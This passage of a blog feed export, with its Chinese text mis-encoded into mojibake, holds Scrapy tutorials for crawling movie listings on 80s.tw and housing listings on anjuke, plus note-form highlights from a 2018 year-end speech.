title = response.xpath(&quot;//div[@class=&#39;info&#39;]/h1/text()&quot;).get()  # å½±ç‰‡å    info = response.xpath(&quot;//div[@class=&#39;info&#39;]/span[1]/text()&quot;).get()  # å½±ç‰‡ç®€ä»‹    release_date = response.xpath(&quot;//div[@class=&#39;clearfix&#39;]/span[5]/text()&quot;).get()  # ä¸Šæ˜ æ—¥æœŸ    mins = response.xpath(&quot;//div[@class=&#39;clearfix&#39;]/span[6]/text()&quot;).get()  # å½±ç‰‡æ—¶é•¿    grade = response.xpath(&quot;//div[@class=&#39;info&#39;]/div[2]/span[1]/text()&quot;).getall()[-1].strip()  # è±†ç“£è¯„åˆ†    size = response.xpath(&quot;//ul[@class=&#39;dllist1&#39;]/li[2]/span[1]/span/text()&quot;).getall()[-1].strip()  # å½±ç‰‡å¤§å°    download_link = response.xpath(&quot;//ul[@class=&#39;dllist1&#39;]/li[2]/span[1]/span/a/@href&quot;).get()  # å½±ç‰‡ä¸‹è½½é“¾æ¥    items = Spider80SItem(title=title, info=info, release_date=release_date, mins=mins, grade=grade, size=size,                          download_link=download_link)    yield items</code></pre><p>åœ¨parse_itemå‡½æ•°ä¸­æˆ‘ä»¬å¤„ç†çˆ¬è™«çš„å“åº”,å¹¶ä»å“åº”ä¸­æå–æ•°æ®.</p><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦æå–</p><ol><li>ç”µå½±å</li><li>å½±ç‰‡ç®€ä»‹</li><li>ä¸Šæ˜ æ—¥æœŸ</li><li>å½±ç‰‡æ—¶é•¿</li><li>è±†ç“£è¯„åˆ†</li><li>å½±ç‰‡å¤§å°</li><li>å½±ç‰‡ä¸‹è½½é“¾æ¥</li></ol><h2 id="å°†æ•°æ®ä¿å­˜ä¸ºJSONæ ¼å¼"><a href="#å°†æ•°æ®ä¿å­˜ä¸ºJSONæ ¼å¼" class="headerlink" title="å°†æ•°æ®ä¿å­˜ä¸ºJSONæ ¼å¼"></a>å°†æ•°æ®ä¿å­˜ä¸ºJSONæ ¼å¼</h2><p>åœ¨çˆ¬è™«é¡¹ç›®ä¸­ç¼–è¾‘Pipelinesç”¨æ¥ä¿å­˜æ•°æ®</p><pre><code>class Spider80SPipeline(object):    def __init__(self):        self.fileProject = open(&quot;80sLink.json&quot;, &#39;wb&#39;)  # æ–‡ä»¶å¯¹è±¡        self.exporter = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)       # JSONè¾“å‡ºå¯¹è±¡    def process_item(self, item, spider):        self.exporter.export_item(item)     # å¤„ç†Itemè¾“å‡º        return item    def close_spider(self, spider):        self.fileProject.close()        # å…³é—­æ–‡ä»¶å¯¹è±¡</code></pre><h1 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h1><h1 id="é¡¹ç›®ç›®å½•"><a href="#é¡¹ç›®ç›®å½•" class="headerlink" title="é¡¹ç›®ç›®å½•"></a>é¡¹ç›®ç›®å½•</h1><pre><code>â”‚  scrapy.cfgâ”‚  start.py        # é¡¹ç›®å¯åŠ¨æ–‡ä»¶â”‚â””â”€Spider_80s    â”‚  items.py    # Model    â”‚  middlewares.py    # ä¸­é—´ä»¶    â”‚  pipelines.py        # ç®¡é“    â”‚  settings.py        # é…ç½®æ–‡ä»¶    â”‚  __init__.py    â”‚    â”œâ”€spiders    â”‚  â”‚  MovieSpider.py        # çˆ¬è™«</code></pre><p>MovieSpider.py</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom Spider_80s.items import Spider80SItemclass MoviespiderSpider(CrawlSpider):    name = &#39;MovieSpider&#39;    allowed_domains = [&#39;80s.tw&#39;]    start_urls = [&#39;https://www.80s.tw/movie/list/-----p/1&#39;]    rules = (        Rule(LinkExtractor(allow=r&#39;https://www.80s.tw/movie/list/-----p/\d&#39;), follow=True),     # ç”µå½±åˆ—è¡¨é¡µurlçš„æå–        Rule(LinkExtractor(allow=&quot;.*/movie/\d&quot;), callback=&quot;parse_item&quot;, follow=False),      # ç”µå½±è¯¦æƒ…é¡µé¢urlçš„æå–    )    def parse_item(self, response):        title = response.xpath(&quot;//div[@class=&#39;info&#39;]/h1/text()&quot;).get()  # å½±ç‰‡å        info = response.xpath(&quot;//div[@class=&#39;info&#39;]/span[1]/text()&quot;).get()  # å½±ç‰‡ç®€ä»‹        release_date = response.xpath(&quot;//div[@class=&#39;clearfix&#39;]/span[5]/text()&quot;).get()  # ä¸Šæ˜ æ—¥æœŸ        mins = response.xpath(&quot;//div[@class=&#39;clearfix&#39;]/span[6]/text()&quot;).get()  # å½±ç‰‡æ—¶é•¿        grade = response.xpath(&quot;//div[@class=&#39;info&#39;]/div[2]/span[1]/text()&quot;).getall()[-1].strip()  # è±†ç“£è¯„åˆ†        size = response.xpath(&quot;//ul[@class=&#39;dllist1&#39;]/li[2]/span[1]/span/text()&quot;).getall()[-1].strip()  # å½±ç‰‡å¤§å°        download_link = response.xpath(&quot;//ul[@class=&#39;dllist1&#39;]/li[2]/span[1]/span/a/@href&quot;).get()  # å½±ç‰‡ä¸‹è½½é“¾æ¥        items = Spider80SItem(title=title, info=info, release_date=release_date, mins=mins, grade=grade, size=size,                              download_link=download_link)        yield items</code></pre><p>items.py</p><pre><code>import scrapyclass Spider80SItem(scrapy.Item):    title = scrapy.Field()    info = scrapy.Field()    release_date = scrapy.Field()    mins = scrapy.Field()    grade = scrapy.Field()    size = scrapy.Field()    download_link = scrapy.Field()</code></pre><p>pipelines.py</p><pre><code>from scrapy.exporters import JsonLinesItemExporterclass Spider80SPipeline(object):    def __init__(self):        self.fileProject = open(&quot;80sLink.json&quot;, &#39;wb&#39;)  # æ–‡ä»¶å¯¹è±¡        self.exporter = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)       # JSONè¾“å‡ºå¯¹è±¡    def process_item(self, item, spider):        self.exporter.export_item(item)     # å¤„ç†Itemè¾“å‡º        return item    def close_spider(self, spider):        self.fileProject.close()        # å…³é—­æ–‡ä»¶å¯¹è±¡</code></pre><p>settings.py</p><pre><code># -*- coding: utf-8 -*-BOT_NAME = &#39;Spider_80s&#39;SPIDER_MODULES = [&#39;Spider_80s.spiders&#39;]NEWSPIDER_MODULE = &#39;Spider_80s.spiders&#39;ROBOTSTXT_OBEY = FalseDOWNLOAD_DELAY = 1DEFAULT_REQUEST_HEADERS = {    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Accept-Language&#39;: &#39;en&#39;,    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;,}ITEM_PIPELINES = {    &quot;Spider_80s.pipelines.Spider80SPipeline&quot;: 300,}</code></pre><h1 id="çˆ¬å–ç»“æœå±•ç¤º"><a href="#çˆ¬å–ç»“æœå±•ç¤º" class="headerlink" title="çˆ¬å–ç»“æœå±•ç¤º"></a>çˆ¬å–ç»“æœå±•ç¤º</h1><p>JSONæ ¼å¼æ•°æ®</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/Hm.390Qns5e8OkhLCnyJI*.M.oh32IOY.gRxS.4oYFc!/b/dDMBAAAAAAAA&amp;bo=gwYXAwAAAAADJ5M!&amp;rf=viewer_4" alt="JSONç»“æœ"></p><p>CSVæ ¼å¼æ•°æ®</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/Jbwf2SVkg7kAKJp0*Ewc.pelbRcxeu.uhN.8UJTD.EE!/b/dDEBAAAAAAAA&amp;bo=gAcZAwAAAAADB78!&amp;rf=viewer_4" alt="CSVç»“æœ"></p><h1 id="JSONæ ¼å¼æ–‡ä»¶è½¬CSVæ ¼å¼"><a href="#JSONæ ¼å¼æ–‡ä»¶è½¬CSVæ ¼å¼" class="headerlink" title="JSONæ ¼å¼æ–‡ä»¶è½¬CSVæ ¼å¼"></a>JSONæ ¼å¼æ–‡ä»¶è½¬CSVæ ¼å¼</h1><pre><code>import csvimport jsonimport sysimport collections  # æœ‰åºå­—å…¸def trans(path):    jsonData = open(path + &#39;.json&#39;,encoding=&#39;utf-8&#39;)    csvfile = open(path + &#39;.csv&#39;, &#39;w&#39;, newline=&#39;&#39;,encoding=&#39;utf-8&#39;)  # python3ä¸‹    for line in jsonData:  # è·å–å±æ€§åˆ—è¡¨        dic = json.loads(line[0:])        keys = dic.keys()        break    writer = csv.writer(csvfile)    writer.writerow(keys)  # å°†å±æ€§åˆ—è¡¨å†™å…¥csvä¸­    for dic in jsonData:  # è¯»å–jsonæ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†valuesæ•°æ®ä¸€æ¬¡ä¸€è¡Œçš„å†™å…¥csvä¸­        dic = json.loads(dic[0:])        writer.writerow(dic.values())    jsonData.close()    csvfile.close()trans(&quot;./80sLink&quot;)</code></pre><p>å°†JSONæ–‡ä»¶è½¬æ¢æˆCSVæ–‡ä»¶ä¹‹åä¼šå‡ºç°ä¹±ç ,è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨Notepad++æ‰“å¼€CSVæ–‡ä»¶,ç„¶å<strong>å°†CSVæ–‡ä»¶çš„ç¼–ç æ”¹æˆUTF-8BOM</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç½—èƒ–2018å¹´ç»ˆæ¼”è®²</title>
      <link href="/2019/01/06/luo-pang-2018-nian-zhong-yan-jiang/"/>
      <url>/2019/01/06/luo-pang-2018-nian-zhong-yan-jiang/</url>
      
        <content type="html"><![CDATA[<h1 id="å¼€åœº"><a href="#å¼€åœº" class="headerlink" title="å¼€åœº"></a>å¼€åœº</h1><ol><li>å²æœˆä¸é¥¶äºº,ä½ ä»¬ç¡®å®æ²¡æœ‰é¥¶è¿‡å²æœˆ</li><li>ä½ æœ‰ä½ çš„è®¡åˆ’,è¿™ä¸ªä¸–ç•Œå¦æœ‰è®¡åˆ’</li><li>ç©¿ç€ä½“é¢æœ‰å„ç§å„æ ·çš„è®¡åˆ’.</li><li>ä»¥å‰å˜åŒ–æ˜¯ç”Ÿæ´»çš„ä¸€éƒ¨åˆ†,ç°åœ¨å˜åŒ–æˆäº†ç”Ÿæ´»çš„æœ¬èº«</li><li>ç†Ÿæ‚‰çš„ä¹Ÿè®¸åªèƒ½ç”¨æ¥æ€€å¿µ,è€Œä¾èµ–çš„æˆ‘ä»¬å¿…é¡»æ”¾æ‰‹</li><li>2019å¹´å¯èƒ½ä¼šæ˜¯è¿‡å»åå¹´é‡Œæœ€å·®çš„ä¸€å¹´,ä½†å´æ˜¯æœªæ¥åå¹´é‡Œæœ€å¥½çš„ä¸€å¹´<ul><li>ä½•å¿…æ‚²è§‚</li></ul></li><li>åšäº‹çš„äººå…¶å®æ— æ‰€è°“æ‚²è§‚è¿˜æ˜¯ä¹è§‚,å› ä¸ºä»–ä»¬åªå…³å¿ƒæ€ä¹ˆæŠŠäº‹åšå¥½,è®©è‡ªå·±çš„ç”Ÿå‘½å¤„äºä¸Šå‡æœŸ<ol><li>ä¸åšäº‹çš„äººçš„é‡è¦ç‰¹ç‚¹æ€»ä¼šé—®ä¸€äº›æŠ½è±¡çš„é—®é¢˜:ç†æƒ³å’Œç°å®æ€ä¹ˆå¹³è¡¡,æˆ‘å’Œä½ å¦ˆæ‰æ°´é‡Œä½ å…ˆæ•‘è°</li></ol></li><li>æŠ½è±¡çš„ä¸¤éš¾,åœ¨å…·ä½“æƒ…å¢ƒä¸­ä¸€ç‚¹å„¿ä¹Ÿä¸éš¾</li><li>æˆ‘ä»¬è¦æå®šçš„,æ— éæ˜¯ä¸€å¼ æ—¶é—´è¡¨</li><li>å®è§‚æ˜¯æˆ‘ä»¬å¿…é¡»æ¥å—çš„,å¾®è§‚æ‰æ˜¯æˆ‘ä»¬å¯ä»¥æœ‰æ‰€ä½œä¸ºçš„.</li><li>æˆ‘ä»¬æ˜¯ä¼å…µ,ä¼å…µå¤©ç”Ÿå°±æ˜¯è¢«åŒ…å›´çš„</li><li><strong>ä¸–ç•Œä¸Šåªæœ‰ä¸€ç§è‹±é›„ä¸»ä¹‰,å°±æ˜¯è®¤æ¸…äº†ç”Ÿæ´»çš„çœŸç›¸è¿˜ä»ç„¶çƒ­çˆ±å®ƒ</strong></li><li>æ—¢ç„¶è¿™ä¸ªä¸–ç•Œå¦æœ‰è®¡åˆ’,é‚£ä¹ˆæˆ‘ä»¬å°±é‡æ–°è®¡åˆ’</li><li>å®å¯è¢«è¯´æˆæ˜¯çŒª,ä¹Ÿä¸€å®šè¦ç«™åœ¨é£å£,å“ªæ€•çœ‹åˆ°åƒå†›ä¸‡é©¬,æˆ‘ä¹Ÿè¦è¿‡é‚£ä¸ªç‹¬æœ¨æ¡¥</li></ol><h1 id="å°è¶‹åŠ¿"><a href="#å°è¶‹åŠ¿" class="headerlink" title="å°è¶‹åŠ¿"></a>å°è¶‹åŠ¿</h1><ol><li>4Gå·²ç»æ˜¯5å¹´å‰çš„äº‹æƒ…äº†,5Gæ—¶ä»£çš„åˆ°æ¥,å¯¹ä½ æ‰€å¤„çš„è¡Œä¸šä¼šé€ æˆä»€ä¹ˆå½±å“?</li><li>æ›¾ä»Šçš„ä¸–ç•Œæ˜¯å¤§æ²³æ¨¡å‹,é¡ºä¹‹è€…æ˜Œ,é€†ä¹‹è€…äº¡.ç°åœ¨çš„ä¸–ç•Œæ˜¯å¤šç±³è¯ºéª¨ç‰Œæ¨¡å‹.</li><li>å¤©çŒ«ä¸ºä»€ä¹ˆå«å¤©çŒ«å‘¢?ä¸ºä»€ä¹ˆä¸èƒ½å«å¤©ç‹—å‘¢?å› ä¸ºçŒ«ç ‚çš„å‘æ˜<ol><li>çŒ«ç ‚ç»å¯¹æ˜¯äººç±»ç§‘æŠ€çš„ä¼Ÿå¤§å‘æ˜</li></ol></li><li><strong>å°è¶‹åŠ¿æ˜¯å½±å“è¶‹åŠ¿çš„è¶‹åŠ¿,æ˜¯å¸¦æ¥æ”¹å˜çš„æ”¹å˜</strong></li><li>ç¾å›¢èƒŒåçš„äººå·¥æ™ºèƒ½:<ol><li>æ¯å¤©2åƒä¸‡å•å¤–å–</li><li>60ä¸‡ä¸ªå¤–å–å°å“¥</li><li>æ¯ä¸ªå°æ—¶æœ€é«˜å³°è¦åš29äº¿æ¬¡è·¯çº¿è§„åˆ’<ul><li><strong>èƒŒå1ä¸‡åç¨‹åºå‘˜</strong></li></ul></li></ol></li><li>å¤©çŒ«çš„åƒäººåƒé¢<strong>(äººå·¥æ™ºèƒ½)</strong><ul><li>é¹¿ç­ç³»ç»Ÿ</li></ul></li><li>è™½ç„¶å¤§è¶‹åŠ¿ä¸æ˜¯æˆ‘çš„æ¸¸æˆ,ä½†æ˜¯ä»–ä¼šæ”¹å˜æˆ‘çš„æ¸¸æˆ</li><li>å…³äºæœºä¼šçš„ä¸¤ä¸ªçœ‹æ³•<ol><li>æ¯ä¸€ç­è½¦åœé çš„æ—¶é—´éƒ½ç‰¹åˆ«çŸ­,çŸ­çš„è‡ªå·±å¾ˆå¯èƒ½èµ¶ä¸ä¸Š,è€Œä¸”æ¯ä¸€ç­è½¦çœ‹èµ·æ¥éƒ½åƒæ˜¯æœ«ç­è½¦</li><li>åœ¨å°è¶‹åŠ¿çš„é€»è¾‘é‡Œ,ä»æ¥æ²¡æœ‰æœ«ç­è½¦<ol><li>2012å¹´å¾®ä¿¡å…¬ä¼—å·</li><li>2013å¹´æ·˜å®æ‰¶æŒç½‘çº¢ç”µå•†</li><li>2014å¹´OTO</li><li>2015å¹´ç¤¾äº¤ç”µå•†</li><li>2016å¹´æ‹¼å›¢</li><li>2017å¹´ç›´æ’­ç”µå•†</li><li>â€¦â€¦ä»æ¥éƒ½æ²¡æœ‰æœ«ç­è½¦,äººç”Ÿå¤„å¤„æ˜¯æœºä¼š.</li></ol></li></ol></li><li>å°è¶‹åŠ¿çš„é€»è¾‘é‡Œ,æ²¡æœ‰ç›´è¾¾è½¦</li><li><strong>å‡¡ æ€ä¸æ­»æˆ‘çš„,éƒ½ä¼šè®©æˆ‘æ›´å¼ºå¤§</strong><ol><li><strong>å‡¡æˆ‘èµ¶ä¸ä¸Šçš„,æˆ‘å°±åœ¨æœªæ¥ç­‰ä»–.</strong></li></ol></li></ol><h1 id="ä¸€äº›è‡ªé—®"><a href="#ä¸€äº›è‡ªé—®" class="headerlink" title="ä¸€äº›è‡ªé—®"></a>ä¸€äº›è‡ªé—®</h1><ol><li>ä½ èƒ½çœ‹åˆ°äº‹å®å—?<ul><li>çœŸç›¸,é€€çš„ç¦»æˆ‘ä»¬è¶Šæ¥è¶Šè¿œ</li><li>çœŸç›¸æœªå¿…ç¥ç§˜,ä½†å¾ˆéšç§˜</li></ul></li><li>åˆ«æŠŠè‡ªå·±å½“åšä¸»æµ</li><li>æˆ‘ä»¬ç”Ÿæ´»åœ¨ä¸€ä¸ªåºå¤§çš„,è¿œè¶…è¿‡è‡ªå·±æ„ŸçŸ¥åŠ›çš„å…±åŒä½“å½“ä¸­</li><li>ç­‰å·çš„æ„æ€?<ol><li><strong>ç­‰å·çš„æ„æ€æ˜¯æœ‰äº›ä¸œè¥¿ä¸é‡è¦</strong><ul><li><strong>æ‰¾åˆ°å¥½å·¥ä½œç­‰äºç¨³å®šçš„æ”¶å…¥,é‚£ä¹ˆå°±æ˜¯è¯´æ”¶å…¥æ‰é‡è¦,è‡ªå·±å–œä¸å–œæ¬¢è¿™ä¸ªå·¥ä½œä¸é‡è¦</strong></li></ul></li></ol></li><li>ä¸æŠ½è±¡å°±æ— æ³•æ·±å…¥æ€è€ƒ,ä¸è¿˜åŸå°±çœ‹ä¸åˆ°æœ¬æ¥é¢ç›®</li><li>åˆ¶é€ ä¸šæ˜¯æˆ‘ä»¬æ„å»ºè‰¯å¥½ç¤¾ä¼šçš„å‹èˆ±çŸ³</li><li>ä½ å¿…é¡»åšä¸€ä¸ªç†æ€§ä¹è§‚æ´¾</li></ol><h1 id="å¤šå…ƒæ€ç»´æ¨¡å‹"><a href="#å¤šå…ƒæ€ç»´æ¨¡å‹" class="headerlink" title="å¤šå…ƒæ€ç»´æ¨¡å‹"></a>å¤šå…ƒæ€ç»´æ¨¡å‹</h1><p>ä¸€ä¸ªäººèƒ½åŒæ—¶ä¿æœ‰å…¨ç„¶ç›¸åçš„ä¸¤ç§è§‚å¿µ,è¿˜èƒ½æ­£å¸¸è¡Œäº‹,æ˜¯ç¬¬ä¸€æµæ™ºæ…§çš„æ ‡å¿—.</p><ul><li>ä¸€ä¸ªäººä¹Ÿæƒ³å¥½å¥½ç”Ÿæ´»</li><li>æœ‰ä¸€ç±»åˆ›æ–°,å«å¾€å›èµ°</li></ul><h1 id="å°è¶‹åŠ¿å†³å®šä¸ªä½“å‘½è¿"><a href="#å°è¶‹åŠ¿å†³å®šä¸ªä½“å‘½è¿" class="headerlink" title="å°è¶‹åŠ¿å†³å®šä¸ªä½“å‘½è¿"></a>å°è¶‹åŠ¿å†³å®šä¸ªä½“å‘½è¿</h1><ul><li>çŸ¥è¯†å¤š,äººç”ŸçŸ­,è¿½ç€å­¦,å°±æŒ‚äº†.</li><li>æ¯ä¸ªäººéƒ½æœ‰ä¸€ä¸ªè®¡åˆ’,ç›´åˆ°è¢«ä¸€æ‹³æ‰“åˆ°è„¸ä¸Š</li><li>è¿‡å»å©šå§»æ˜¯æˆå¹´çš„ç¬¬ä¸€ä»¶äº‹,ç°åœ¨,å©šå§»æ˜¯æŠŠè‡ªå·±æ•´ç†å¥½åæ‰åšçš„äº‹.<br>æˆ‘ç‰¹åˆ«åæ‚”60å²é‚£å¹´æ²¡æœ‰å­¦å°æç´,å¦åˆ™,æˆ‘å°±æœ‰40å¹´ç»éªŒäº†.</li></ul><p>æˆ‘ä»¬è¿™ä»£äºº60å²ä¸Šä¸ªå¤§å­¦,70å²åˆ›ä¸ªä¸š,80å²å­¦ä¸ªæ‰‹è‰º.æˆ‘ä»¬è¿™ä»£äººéƒ½æ˜¯è¿™æ ·ç”Ÿæ´»,ä¸è¿™æ ·ç”Ÿæ´»éš¾é“è¦ç­‰åˆ°100å²éš¾é“å†åæ‚”å—?</p><ul><li>ç§ä¸€æ£µæ ‘æœ€å¥½çš„æ—¶é—´æ˜¯åå¹´å‰,å…¶å®å°±æ˜¯ç°åœ¨</li></ul><h1 id="å¦‚ä½•é¢å¯¹æŒ«æŠ˜"><a href="#å¦‚ä½•é¢å¯¹æŒ«æŠ˜" class="headerlink" title="å¦‚ä½•é¢å¯¹æŒ«æŠ˜"></a>å¦‚ä½•é¢å¯¹æŒ«æŠ˜</h1><ul><li>ä¸˜å‰å°”:è¿™ä¸æ˜¯ç»“æŸ,ç”šè‡³ä¸æ˜¯ç»“æŸçš„å¼€å§‹,åªæ˜¯å¼€å§‹çš„ç»“æŸ.</li><li>æ‰€æœ‰èƒ½ç©¿è¶Šæ—¶é—´çš„ä¸œè¥¿,å°±è¯¥åšå®ˆ,æ‰€æœ‰ä¼šè¢«æ—¶é—´è¿‡æ»¤çš„,è¯¥ç¿»ç¯‡å°±ç¿»ç¯‡.</li><li>è¿™ä¸ªæ—¶ä»£ä¸è¦åœ¨æœ‹å‹åœˆé‡Œè§‚å¤©ä¸‹,æœ‰æœºä¼šç¿»ç¿»ä»–çš„æ”¶è—å¤¹</li><li>ä½ åœ¨æœ‹å‹åœˆé‡Œåˆä½›åˆä¸§,ä½ åœ¨æ”¶è—å¤¹é‡Œç§¯æå‘ä¸Š.</li><li>äººçš„æ„ŸçŸ¥å’Œåˆ¤æ–­,èƒœè¿‡åƒä¸‡æ¡æ•°æ®</li><li>äººçš„è‰¯çŸ¥è‰¯èƒ½,æ˜¯æœ€å¥½çš„æ„ŸçŸ¥å’Œåˆ¤æ–­çš„å·¥å…·</li><li>ç”¨äººçš„ä½“éªŒä¸ˆé‡ä¸–ç•Œ</li></ul><h1 id="æ—¶é—´æ„¿æ„å’Œæˆ‘åšæœ‹å‹å—"><a href="#æ—¶é—´æ„¿æ„å’Œæˆ‘åšæœ‹å‹å—" class="headerlink" title="æ—¶é—´æ„¿æ„å’Œæˆ‘åšæœ‹å‹å—?"></a>æ—¶é—´æ„¿æ„å’Œæˆ‘åšæœ‹å‹å—?</h1><p>é•¿æœŸä¸»ä¹‰</p><ul><li>ä¸€æ—¦ä¸­æ–­,å‰åŠŸå°½å¼ƒ.</li><li><strong>æ™®é€šäººçš„åŠªåŠ›,åœ¨é•¿æœŸä¸»ä¹‰çš„å¤åˆ©ä¸‹,ä¼šç§¯ç´¯æˆå¥‡è¿¹</strong></li><li>ä¸€åƒå¹´æœ‰ä¸€åƒå¹´çš„å¹²æ³•,ä¸€ä¸ªæœˆæœ‰ä¸€ä¸ªæœˆçš„å¹²æ³•.<ul><li>æ’©å¦¹é€ç¤¼ç‰©ä¸è¦ä¸€æ¬¡é€å®Œ,ä¸€ä¸ªæœˆæ¯å‘¨éƒ½é€ä¸€ä¸ªå°ç¤¼ç‰©ä¼šå¥½å¾ˆå¤š.é•¿æœŸä¸»ä¹‰å®æˆ˜.</li></ul></li><li><strong>æˆå°±=æ ¸å¿ƒç®—æ³•xå¤§é‡é‡å¤åŠ¨ä½œ2(å¹³æ–¹)</strong></li><li>æ‰€æœ‰çš„äº‹åˆ°æœ€åéƒ½ä¼šæ˜¯å¥½äº‹,å¦‚æœè¿˜ä¸æ˜¯é‚£å®ƒå°±è¿˜æ²¡åˆ°æœ€å</li></ul><p><strong>å¯¹æœªæ¥æœ€å¤§çš„æ…·æ…¨,æ˜¯æŠŠä¸€åˆ‡çŒ®ç»™ç°åœ¨</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…« </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpideræ¡ˆä¾‹å®‰å±…å®¢äºŒæ‰‹æˆ¿çˆ¬è™«</title>
      <link href="/2018/12/31/scrapycrawlspider-an-li-an-ju-ke-er-shou-fang-pa-chong/"/>
      <url>/2018/12/31/scrapycrawlspider-an-li-an-ju-ke-er-shou-fang-pa-chong/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®å±•ç¤º"><a href="#æ•°æ®å±•ç¤º" class="headerlink" title="æ•°æ®å±•ç¤º"></a>æ•°æ®å±•ç¤º</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/EJP*NR5jwlyuxBzfO1jhTzw38z.Vo6n8wzYxlO2dwVM!/b/dFIBAAAAAAAA&amp;bo=bQZTAwAAAAADBxk!&amp;rf=viewer_4" alt="æ•°æ®å±•ç¤º"></p><pre><code>{    &quot;å°åŒºå&quot;:&quot;å­¦åºœåè‹‘&quot;,    &quot;æ€»ä»·&quot;:&quot;75&quot;,    &quot;é¦–ä»˜&quot;:&quot;22.50ä¸‡&quot;,    &quot;å•ä»·&quot;:&quot;9036 å…ƒ/mÂ²&quot;,    &quot;é¢ç§¯&quot;:&quot;83å¹³æ–¹ç±³&quot;,    &quot;æˆ¿å±‹ç±»å‹&quot;:&quot;2å®¤2å…1å«&quot;,    &quot;å»ºé€ æ—¶é—´&quot;:&quot;2013å¹´&quot;,    &quot;æˆ¿å±‹ç±»å‹&quot;:&quot;æ™®é€šä½å®…&quot;,    &quot;å»ºé€ å¹´é™&quot;:&quot;æ»¡äº”å¹´&quot;}</code></pre><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><p>é¡¹ç›®ç›®å½•ç»“æ„</p><pre><code>â”‚  scrapy.cfgâ”‚  start.py        # Scrapyå¯åŠ¨æ–‡ä»¶â”‚  XuChangHouse.json    # æ•°æ®å­˜å‚¨â”‚â””â”€XuChangHouse    â”‚  items.py    â”‚  middlewares.py    â”‚  pipelines.py    â”‚  settings.py    â”‚  __init__.py    â”‚    â”œâ”€spiders    â”‚  â”‚  resold_Apartment.py    # çˆ¬è™«    â”‚  â”‚  __init__.py</code></pre><p>setting.py</p><pre><code>BOT_NAME = &#39;XuChangHouse&#39;SPIDER_MODULES = [&#39;XuChangHouse.spiders&#39;]NEWSPIDER_MODULE = &#39;XuChangHouse.spiders&#39;ROBOTSTXT_OBEY = FalseDOWNLOAD_DELAY = 1DEFAULT_REQUEST_HEADERS = {    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Accept-Language&#39;: &#39;en&#39;,    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;,    &quot;TE&quot;:&quot;Trailers&quot;,}ITEM_PIPELINES = {   &#39;XuChangHouse.pipelines.XuchanghousePipeline&#39;: 300,}</code></pre><p>resold_Apartment.py</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom XuChangHouse.items import XuchanghouseItemclass ResoldApartmentSpider(CrawlSpider):    name = &#39;resold_Apartment&#39;    allowed_domains = [&#39;xuchang.anjuke.com&#39;]    start_urls = [&#39;https://xuchang.anjuke.com/sale/p1-rd1/#filtersort&#39;]    rules = (        Rule(LinkExtractor(allow=r&#39;https://xuchang.anjuke.com/sale/.+/#filtersort&#39;), follow=True), # åŒ¹é…é¡µæ•°        Rule(LinkExtractor(allow=r&#39;.+[A-Z0-9]?from=.*&#39;,),callback=&quot;parse_item&quot;,follow=False),     # è¯¦æƒ…é¡µé¢    )    def parse_item(self, response):        estate = response.xpath(&quot;//div[@class=&#39;houseInfo-content&#39;]/a/text()&quot;).get()  # æ‰€å±å°åŒº        total = response.css(&#39;.light &gt; em:nth-child(1)::text&#39;).get()  # æ€»ä»·        down_payment = response.xpath(&quot;//ul/li[6]/div[2]/text()&quot;).get().strip()  # é¦–ä»˜        unit_price = response.xpath(&quot;//ul/li[3]/div[2]/text()&quot;).get().strip()  # æˆ¿å±‹å•ä»·        area = response.xpath(&quot;//ul/li[5]/div[2]/text()&quot;).get().strip()  # å»ºç­‘é¢ç§¯        family_type = response.xpath(&quot;//ul/li[2]/div[2]/text()&quot;).get().replace(&#39;\t&#39;, &#39;&#39;)  # æˆ·å‹        time = response.xpath(&quot;//ul/li[7]/div[2]/text()&quot;).get().strip() # å»ºé€ å¹´ä»£        house_types = response.xpath(&#39;//ul/li[10]/div[2]/text()&#39;).get().strip()       # æˆ¿å±‹ç±»å‹        age_limit = response.xpath(&quot;//ul/li[13]/div[2]/text()&quot;).get().strip()       # æˆ¿æœ¬å¹´é™        # Monthly_payment = response.css(&quot;#reference_monthpay&quot;).get() # æœˆä¾›,spanæ ‡ç­¾åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºä½†æ˜¯scrapyæå–ä¹‹åæ²¡æœ‰å†…å®¹        # print(f&quot;å°åŒº{estate}\nå¹´ä»£{time}\nç±»å‹{house_types}\næˆ¿æœ¬å¹´é™{age_limit}\næˆ·å‹{family_type}é¢ç§¯{area}å•ä»·{unit_price}\né¦–ä»˜{down_payment}\n&quot;)        item = XuchanghouseItem(estate=estate,total=total,down_payment=down_payment,unit_price=unit_price,area=area,family_type=family_type,time=time,house_types=house_types,age_limit=age_limit)        yield item</code></pre><p>items.py</p><pre><code>import scrapyclass 